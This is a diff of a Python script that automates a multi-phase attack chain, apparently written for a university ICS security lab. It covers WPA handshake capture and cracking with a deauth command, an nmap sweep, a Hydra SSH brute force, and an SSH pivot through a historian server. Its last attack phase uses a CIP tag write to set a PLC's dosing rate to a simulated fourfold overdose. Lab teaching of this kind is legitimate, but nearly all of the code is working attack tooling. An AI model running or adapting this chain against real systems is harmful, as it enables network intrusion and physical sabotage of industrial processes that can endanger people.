@@ -11,43 +11,66 @@ from datetime import datetime
 from dataclasses import dataclass, field
 from typing import Optional
 
-# ── Dependency bootstrap ──────────────────────────────────────────────────────
+# ── Virtual environment bootstrap ────────────────────────────────────────────
+# Re-exec inside ~/attack_script/venv if not already running there.
+VENV_DIR    = os.path.expanduser("~/attack_script/venv")
+VENV_PYTHON = os.path.join(VENV_DIR, "bin", "python3")
+VENV_ACTIVATE = os.path.join(VENV_DIR, "bin", "activate")
+
+def _ensure_venv():
+    if not os.path.exists(VENV_PYTHON):
+        print("[!] venv not found. Run the following to create it:")
+        print(f"    python3 -m venv {VENV_DIR}")
+        print(f"    source {VENV_ACTIVATE}")
+        print("    pip install rich paramiko pycomm3")
+        sys.exit(1)
+    # If we're not already running inside the venv, re-exec with venv Python
+    if os.path.realpath(sys.executable) != os.path.realpath(VENV_PYTHON):
+        os.execv(VENV_PYTHON, [VENV_PYTHON] + sys.argv)
+
+_ensure_venv()
+
+# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
 def _require(pkg, import_name=None):
     import importlib
     name = import_name or pkg
     try:
         return importlib.import_module(name)
     except ImportError:
-        print(f"[*] Installing {pkg}...")
+        print(f"[*] Installing {pkg} into venv...")
         subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
         return importlib.import_module(name)
 
-rich       = _require("rich")
-paramiko   = _require("paramiko")
-pycomm3    = _require("pycomm3")
+_require("rich")
+_require("paramiko")
+_require("pycomm3")
 
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 from rich.rule import Rule
 from rich.prompt import Confirm, Prompt
-from rich.progress import Progress, SpinnerColumn, TextColumn
+from rich.progress import (
+    Progress, SpinnerColumn, BarColumn,
+    TextColumn, TimeElapsedColumn, TaskProgressColumn
+)
 from rich.markup import escape
-from pycomm3 import LogixDriver
+from rich.text import Text
+import paramiko
 
 console = Console()
 
 # ── Static config — edit if your lab topology changes ────────────────────────
 CFG = {
     "wifi": {
-        "interface":     "wlan0",
-        "monitor_iface": "wlan0mon",
-        "wordlist":      "/usr/share/wordlists/rockyou.txt",
-        "capture_file":  "/tmp/incs4810_capture",
+        "interface":    "wlan0",
+        "monitor_iface":"wlan0mon",
+        "wordlist":     "/usr/share/wordlists/rockyou.txt",
+        "capture_file": "/tmp/incs4810_capture",
     },
     "nmap": {
-        "idmz_subnet":   "10.10.10.0/24",
-        "ports":         "22,80,443,3000,8086,102,44818",
+        "idmz_subnet":  "10.10.10.0/24",
+        "ports":        "22,80,443,3000,8086,102,44818",
     },
     "historian": {
         "ip":       "10.10.10.20",
@@ -59,9 +82,9 @@ CFG = {
         "ip": "10.10.10.50",   # Cowrie — never target directly
     },
     "plc": {
-        "ip":          "10.20.20.100",
-        "tag":         "Dosage_Rate",
-        "safe_value":  8,
+        "ip":           "10.20.20.100",
+        "tag":          "Dosage_Rate",
+        "safe_value":   8,
         "attack_value": 32,
     },
     "hydra": {
@@ -82,13 +105,34 @@ class PhaseResult:
 
 results: list[PhaseResult] = []
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
+# ── UI helpers ────────────────────────────────────────────────────────────────
+
+ASCII_BANNER = (
+    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
+    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
+    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
+    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
+    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
+    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
+    "\n"
+    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
+    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
+    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
+    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
+    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
+    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                   \n"
+)
+
 def banner():
+    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
     console.print(Panel(
-        "[bold red]INCS 4810 — Red Team Attack Chain[/bold red]\n"
-        "[dim]BCIT Authorized Lab  |  ISA/IEC 62443  |  Supervisor: Victor Mendez[/dim]\n"
-        "[yellow]All actions are authorized and confined to the isolated lab network.[/yellow]",
-        expand=False
+        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
+        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
+        "[dim]Instructor: Victor Mendez  "
+        f"|  venv: {VENV_DIR}[/dim]\n"
+        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
+        border_style="red",
+        expand=False,
     ))
 
 
@@ -98,20 +142,24 @@ def phase_header(n: int, title: str):
 
 
 def ok(msg: str):
-    console.print(f"[bold green][+][/bold green] {msg}")
+    console.print(f"[bold green] [+][/bold green] [green]{msg}[/green]")
 
 
 def warn(msg: str):
-    console.print(f"[bold yellow][!][/bold yellow] {msg}")
+    console.print(f"[bold yellow] [!][/bold yellow] [yellow]{msg}[/yellow]")
 
 
 def err(msg: str):
-    console.print(f"[bold red][-][/bold red] {msg}")
+    console.print(f"[bold red] [-][/bold red] [red]{msg}[/red]")
+
+
+def info(msg: str):
+    console.print(f"[bold blue] [*][/bold blue] [blue]{msg}[/blue]")
 
 
 def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
     """Run a shell command, return (returncode, stdout+stderr)."""
-    console.print(f"[dim]$ {cmd}[/dim]")
+    console.print(f"[dim]$ {escape(cmd)}[/dim]")
     try:
         proc = subprocess.run(
             cmd, shell=True, timeout=timeout,
@@ -123,6 +171,34 @@ def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, st
         return proc.returncode, proc.stdout
     except subprocess.TimeoutExpired:
         return -1, "TIMEOUT"
+
+
+def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
+    """Open and return an authenticated SSHClient. Raises on failure."""
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(
+        hostname=hostname,
+        port=port,
+        username=username,
+        password=password,
+        timeout=15,
+    )
+    ok(f"SSH connected  {username}@{hostname}:{port}")
+    return client
+
+
+def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str]:
+    """Execute a command on an open SSHClient, return (stdout, stderr)."""
+    info(f"remote $ {escape(cmd)}")
+    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
+    stdout = stdout_ch.read().decode()
+    stderr = stderr_ch.read().decode()
+    if stdout.strip():
+        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
+    if stderr.strip():
+        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
+    return stdout, stderr
 
 
 def confirm_phase(title: str) -> bool:
@@ -143,11 +219,11 @@ def phase1_wifi_crack() -> PhaseResult:
     wl      = CFG["wifi"]["wordlist"]
 
     ok("Starting monitor mode...")
-    run_cmd(f"airmon-ng check kill")
+    run_cmd("airmon-ng check kill")
     run_cmd(f"airmon-ng start {iface}")
 
     ok(f"Capturing handshake on ch {channel} (60 s)...")
-    warn("Run in a second terminal: aireplay-ng --deauth 10 -a " + bssid + " " + mon)
+    warn(f"Run in a second terminal: aireplay-ng --deauth 10 -a {bssid} {mon}")
     run_cmd(
         f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
         timeout=75
@@ -157,8 +233,8 @@ def phase1_wifi_crack() -> PhaseResult:
     rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)
 
     if "KEY FOUND" in out:
-        key_line = [l for l in out.splitlines() if "KEY FOUND" in l]
-        r.finding = key_line[0] if key_line else "KEY FOUND"
+        key_lines = [l for l in out.splitlines() if "KEY FOUND" in l]
+        r.finding = key_lines[0] if key_lines else "KEY FOUND"
         r.status  = "success"
         ok(r.finding)
     else:
@@ -189,6 +265,7 @@ def phase2_idmz_recon() -> PhaseResult:
     else:
         warn("Historian not found in scan output — check connectivity")
         r.status  = "failed"
+        r.finding = "Historian not reachable"
 
     if honeypot_found:
         warn(f"Cowrie honeypot detected at {CFG['honeypot']['ip']} — DO NOT target this host")
@@ -201,14 +278,14 @@ def phase3_hydra_brute() -> PhaseResult:
     phase_header(3, "SSH Brute Force on Historian (Hydra)")
     r = PhaseResult("Hydra SSH Brute Force")
 
-    ip = CFG["historian"]["ip"]
-    wl = CFG["hydra"]["wordlist"]
-    t  = CFG["hydra"]["threads"]
-    u  = CFG["historian"]["username"]
+    ip   = CFG["historian"]["ip"]
+    user = CFG["historian"]["username"]
+    wl   = CFG["hydra"]["wordlist"]
+    t    = CFG["hydra"]["threads"]
 
-    ok(f"Running Hydra against {ip}:22 (user: {u})")
+    ok(f"Running Hydra against {ip}:22  (user: {user})")
     rc, out = run_cmd(
-        f"hydra -l {u} -P {wl} {ip} ssh -t {t} -V -f",
+        f"hydra -l {user} -P {wl} {ip} ssh -t {t} -V -f",
         timeout=300
     )
 
@@ -230,15 +307,13 @@ def phase4_ssh_pivot() -> PhaseResult:
     phase_header(4, "SSH into Historian — Lateral Movement Recon")
     r = PhaseResult("SSH Pivot / OT Recon")
 
-    ip   = CFG["historian"]["ip"]
-    user = CFG["historian"]["username"]
-    pwd  = CFG["historian"]["password"]
+    ip       = CFG["historian"]["ip"]
+    username = CFG["historian"]["username"]
+    password = CFG["historian"]["password"]
+    port     = CFG["historian"]["port"]
 
     try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(ip, port=22, username=user, password=pwd, timeout=15)
-        ok(f"SSH connected to {ip} as {user}")
+        client = ssh_connect(hostname=ip, username=username, password=password, port=port)
 
         commands = {
             "OT syslog (last 20 lines)": "grep '10.20.20' /var/log/syslog | tail -20",
@@ -248,11 +323,9 @@ def phase4_ssh_pivot() -> PhaseResult:
 
         findings = []
         for label, cmd in commands.items():
-            _, stdout, stderr = client.exec_command(cmd)
-            out = stdout.read().decode() + stderr.read().decode()
-            console.print(f"\n[bold]{label}:[/bold]")
-            console.print(f"[dim]{escape(out)}[/dim]")
-            findings.append(f"{label}:\n{out}")
+            console.print(f"\n[bold cyan]{label}[/bold cyan]")
+            stdout, stderr = ssh_run(client, cmd)
+            findings.append(f"{label}:\n{stdout}")
 
         r.finding = f"OT zone route confirmed; PLC {CFG['plc']['ip']} reachable"
         r.status  = "success"
@@ -261,7 +334,7 @@ def phase4_ssh_pivot() -> PhaseResult:
 
     except paramiko.AuthenticationException:
         r.status  = "failed"
-        r.finding = "SSH auth failed — update CFG with correct credentials"
+        r.finding = f"SSH auth failed for {username}@{ip} — update CFG credentials"
         err(r.finding)
     except Exception as e:
         r.status  = "failed"
@@ -275,12 +348,17 @@ def phase5_plc_attack() -> PhaseResult:
     phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
     r = PhaseResult("PLC CIP Write")
 
-    plc_ip    = CFG["plc"]["ip"]
-    tag       = CFG["plc"]["tag"]
-    safe_val  = CFG["plc"]["safe_value"]
-    atk_val   = CFG["plc"]["attack_value"]
+    plc_ip   = CFG["plc"]["ip"]
+    tag      = CFG["plc"]["tag"]
+    safe_val = CFG["plc"]["safe_value"]
+    atk_val  = CFG["plc"]["attack_value"]
 
-    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on {plc_ip}")
+    hist_ip       = CFG["historian"]["ip"]
+    hist_port     = CFG["historian"]["port"]
+    hist_username = CFG["historian"]["username"]
+    hist_password = CFG["historian"]["password"]
+
+    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
     warn("MasterFlex pump will physically change behavior.")
 
     if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
@@ -288,50 +366,50 @@ def phase5_plc_attack() -> PhaseResult:
         r.finding = "Skipped by operator"
         return r
 
-    # Run on Historian via SSH so it originates from 10.10.10.20
+    # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
+    # source the venv first so pycomm3 is available on the remote host.
     payload = (
-        f"python3 -c \""
-        f"from pycomm3 import LogixDriver; "
-        f"plc = LogixDriver('{plc_ip}'); "
-        f"plc.open(); "
-        f"cur = plc.read('{tag}'); print('Before:', cur.value); "
-        f"plc.write(('{tag}', {atk_val})); "
-        f"after = plc.read('{tag}'); print('After:', after.value); "
-        f"plc.close()\""
+        f"source {VENV_ACTIVATE} && python3 - <<'PYEOF'\n"
+        f"from pycomm3 import LogixDriver\n"
+        f"with LogixDriver('{plc_ip}') as plc:\n"
+        f"    cur = plc.read('{tag}')\n"
+        f"    print('Before:', cur.value)\n"
+        f"    plc.write(('{tag}', {atk_val}))\n"
+        f"    after = plc.read('{tag}')\n"
+        f"    print('After:', after.value)\n"
+        f"PYEOF"
     )
 
     try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(
-            CFG["historian"]["ip"], port=22,
-            username=CFG["historian"]["username"],
-            password=CFG["historian"]["password"],
-            timeout=15
+        client = ssh_connect(
+            hostname=hist_ip,
+            username=hist_username,
+            password=hist_password,
+            port=hist_port,
         )
-        ok(f"Connected to Historian; sending CIP Write to {plc_ip}")
-        _, stdout, stderr = client.exec_command(payload, timeout=30)
-        out  = stdout.read().decode()
-        errs = stderr.read().decode()
+        ok(f"Sending CIP Write via Historian ({hist_ip}) → PLC ({plc_ip})")
+        stdout, stderr = ssh_run(client, payload, timeout=30)
         client.close()
 
-        console.print(f"[dim]{escape(out)}{escape(errs)}[/dim]")
-
-        if f"After: {atk_val}" in out:
+        if f"After: {atk_val}" in stdout:
             r.status  = "success"
             r.finding = f"{tag} written: {safe_val} → {atk_val} (4x overdose simulated)"
             ok(r.finding)
-        elif "Error" in errs or "Traceback" in errs:
+        elif "Error" in stderr or "Traceback" in stderr:
             r.status  = "failed"
-            r.finding = errs[:300]
+            r.finding = stderr[:300]
             err(r.finding)
         else:
             r.status  = "success"
-            r.finding = f"CIP Write sent; verify on PLC/Grafana. Output: {out[:200]}"
+            r.finding = f"CIP Write sent — verify tag value on PLC / Grafana"
             warn(r.finding)
 
-        r.output = out + errs
+        r.output = stdout + stderr
 
+    except paramiko.AuthenticationException:
+        r.status  = "failed"
+        r.finding = f"SSH auth failed for {hist_username}@{hist_ip}"
+        err(r.finding)
     except Exception as e:
         r.status  = "failed"
         r.finding = str(e)
@@ -344,33 +422,40 @@ def phase6_defense_check() -> PhaseResult:
     phase_header(6, "Defense Validation (Secure State)")
     r = PhaseResult("Defense Validation")
 
-    ok("Checking Suricata alerts on IDS (10.20.20.5)...")
-    ids_ip  = "10.20.20.5"
-    ids_cmd = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"
+    ids_ip       = "10.20.20.5"
+    ids_username = CFG["historian"]["username"]
+    ids_password = CFG["historian"]["password"]
+    ids_port     = CFG["historian"]["port"]
+    ids_cmd      = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"
+
+    info(f"Checking Suricata alerts on IDS ({ids_ip})...")
 
     try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        # IDS uses same creds as Historian in this lab
-        client.connect(ids_ip, port=22,
-                       username=CFG["historian"]["username"],
-                       password=CFG["historian"]["password"],
-                       timeout=15)
-        _, stdout, _ = client.exec_command(ids_cmd)
-        out = stdout.read().decode()
+        client = ssh_connect(
+            hostname=ids_ip,
+            username=ids_username,
+            password=ids_password,
+            port=ids_port,
+        )
+        stdout, _ = ssh_run(client, ids_cmd)
         client.close()
 
-        if out.strip():
+        if stdout.strip():
             ok("Suricata CIP alert triggered:")
-            console.print(f"[yellow]{escape(out)}[/yellow]")
+            console.print(f"[yellow]{escape(stdout)}[/yellow]")
             r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
+            r.status  = "success"
         else:
             warn("No Suricata CIP alerts found — check rule deployment")
             r.finding = "No Suricata alerts detected"
+            r.status  = "success"
 
-        r.status = "success"
-        r.output = out
+        r.output = stdout
 
+    except paramiko.AuthenticationException:
+        r.status  = "failed"
+        r.finding = f"SSH auth failed for {ids_username}@{ids_ip}"
+        err(r.finding)
     except Exception as e:
         r.status  = "failed"
         r.finding = str(e)
@@ -379,35 +464,36 @@ def phase6_defense_check() -> PhaseResult:
     return r
 
 
-# ── Report ────────────────────────────────────────────────────────────────────
+# ── Final report ──────────────────────────────────────────────────────────────
 
 def print_report():
     console.print()
-    console.rule("[bold]Attack Chain Report[/bold]")
+    console.rule("[bold white]Attack Chain Report[/bold white]")
 
-    table = Table(show_header=True, header_style="bold magenta")
-    table.add_column("Phase",   style="cyan",  width=28)
-    table.add_column("Status",  style="white", width=10)
-    table.add_column("Finding", style="white", width=55)
-
-    status_color = {
-        "success": "green",
-        "failed":  "red",
-        "skipped": "yellow",
-        "pending": "dim",
+    STATUS_STYLE = {
+        "success": ("green",  " SUCCESS"),
+        "failed":  ("red",    " FAILED "),
+        "skipped": ("yellow", " SKIPPED"),
+        "pending": ("dim",    " PENDING"),
     }
 
-    for r in results:
-        color = status_color.get(r.status, "white")
+    table = Table(show_header=True, header_style="bold magenta", border_style="dim")
+    table.add_column("#",       style="dim",   width=3)
+    table.add_column("Phase",   style="cyan",  width=26)
+    table.add_column("Status",  width=10)
+    table.add_column("Finding", width=54)
+
+    for i, r in enumerate(results, 1):
+        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
         table.add_row(
+            str(i),
             r.phase,
-            f"[{color}]{r.status.upper()}[/{color}]",
-            r.finding
+            f"[bold {color}]{label}[/bold {color}]",
+            r.finding,
         )
 
     console.print(table)
 
-    # Save JSON report
     report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
     data = [
         {"phase": r.phase, "status": r.status,
@@ -417,18 +503,18 @@ def print_report():
     with open(report_path, "w") as f:
         json.dump(data, f, indent=2)
 
-    ok(f"Full report saved: {report_path}")
+    ok(f"Full JSON report saved: {report_path}")
 
 
 # ── Phase registry ────────────────────────────────────────────────────────────
 
 PHASES = [
-    (1, "WiFi AP Crack",          phase1_wifi_crack),
-    (2, "IDMZ Recon",             phase2_idmz_recon),
-    (3, "SSH Brute Force",        phase3_hydra_brute),
-    (4, "SSH Pivot / OT Recon",   phase4_ssh_pivot),
-    (5, "PLC CIP Write Attack",   phase5_plc_attack),
-    (6, "Defense Validation",     phase6_defense_check),
+    (1, "WiFi AP Crack",         phase1_wifi_crack),
+    (2, "IDMZ Recon",            phase2_idmz_recon),
+    (3, "SSH Brute Force",       phase3_hydra_brute),
+    (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
+    (5, "PLC CIP Write Attack",  phase5_plc_attack),
+    (6, "Defense Validation",    phase6_defense_check),
 ]
 
 
@@ -450,23 +536,43 @@ def main():
 
     banner()
 
-    selected = set(args.phases) if args.phases else set(n for n, _, _ in PHASES)
+    selected = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
 
-    for n, title, fn in PHASES:
-        if n not in selected:
-            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
-            continue
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[bold cyan]{task.description}"),
+        BarColumn(bar_width=30),
+        TaskProgressColumn(),
+        TimeElapsedColumn(),
+        console=console,
+        transient=False,
+    ) as progress:
+        overall = progress.add_task(
+            "Attack Chain", total=len(PHASES)
+        )
 
-        if not args.auto and not confirm_phase(f"Phase {n}: {title}"):
-            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
-            continue
+        for n, title, fn in PHASES:
+            progress.update(overall, description=f"Phase {n}: {title}")
 
-        r = fn()
-        results.append(r)
+            if n not in selected:
+                results.append(PhaseResult(title, status="skipped", finding="Not selected"))
+                progress.advance(overall)
+                continue
 
-        if r.status == "failed" and not args.auto:
-            if not Confirm.ask("[red]Phase failed — continue to next phase?[/red]", default=True):
-                break
+            if not args.auto and not confirm_phase(f"Phase {n}: {title}"):
+                results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
+                progress.advance(overall)
+                continue
+
+            r = fn()
+            results.append(r)
+            progress.advance(overall)
+
+            if r.status == "failed" and not args.auto:
+                if not Confirm.ask("[red]Phase failed — continue to next phase?[/red]", default=True):
+                    break
+
+        progress.update(overall, description="[green]Complete[/green]")
 
     print_report()
 
